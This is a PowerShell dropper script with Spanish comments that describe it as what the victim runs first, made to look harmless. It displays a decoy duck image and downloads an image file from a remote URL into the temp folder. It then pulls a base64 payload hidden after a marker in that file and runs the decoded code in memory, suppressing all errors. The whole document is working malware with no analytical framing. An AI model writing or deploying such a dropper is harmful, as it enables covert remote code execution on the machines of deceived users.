# dropper.ps1 - Lo que la víctima ejecutará inicialmente
# Código diseñado para parecer inofensivo

# Función para extraer datos ocultos
function Extract-HiddenData {
    param (
        [string]$ImagePath
    )
    
    # Leer el archivo completo como texto
    $content = Get-Content -Path $ImagePath -Raw -Encoding Byte
    $contentText = [System.Text.Encoding]::ASCII.GetString($content)
    
    # Buscar el marcador
    $marker = "<!--PAYLOAD:START-->"
    $startIndex = $contentText.IndexOf($marker)
    
    if ($startIndex -gt 0) {
        # Extraer el payload codificado
        $encodedPayload = $contentText.Substring($startIndex + $marker.Length).Trim()
        
        # Decodificar
        $decodedBytes = [System.Convert]::FromBase64String($encodedPayload)
        $decodedText = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
        
        return $decodedText
    }
    
    return $null
}

# El dropper aparenta mostrar sólo una imagen
Write-Host "Mostrando imagen de pato..." -ForegroundColor Cyan

# Descargar la imagen si no existe localmente (podría estar en un repositorio público)
$imagePath = "$env:TEMP\cute_duck.png"
if (-not (Test-Path $imagePath)) {
    $imageUrl = "https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg"  # URL del repositorio
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($imageUrl, $imagePath)
    }
    catch {
        Write-Host "Error al descargar la imagen" -ForegroundColor Red
        exit
    }
}

# Intentar mostrar la imagen para parecer legítimo
try {
    Start-Process $imagePath
}
catch {
    # Silenciar errores
}

# Ejecución sigilosa de la carga maliciosa
try {
    # Extraer el payload oculto
    $hiddenCode = Extract-HiddenData -ImagePath $imagePath
    
    if ($hiddenCode) {
        # Ejecutar el código en memoria
        $scriptBlock = [Scriptblock]::Create($hiddenCode)
        Invoke-Command -ScriptBlock $scriptBlock
    }
}
catch {
    # Silenciar errores
}
